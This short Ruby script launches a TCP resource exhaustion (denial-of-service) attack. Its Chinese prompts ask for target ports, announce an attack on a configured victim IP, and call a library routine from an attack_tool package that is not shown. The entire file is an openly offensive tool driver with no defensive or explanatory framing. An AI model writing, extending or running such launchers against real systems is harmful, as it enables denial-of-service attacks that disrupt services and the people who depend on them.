require_relative '../lib/attack_tool/tcp/use_up_tcp_resrc.rb'
require_relative '../config_con_var.rb'

puts color_green("请输入一系列目标端口")
ports = read_nums
print color_red("开始对"), "#{CONFIG[:victim_ip]}", color_red("发起tcp资源消耗攻击"), "\n"
TCPP.use_up_tcp_resrc($pcap, ports)
puts color_azure("攻击结束")
readline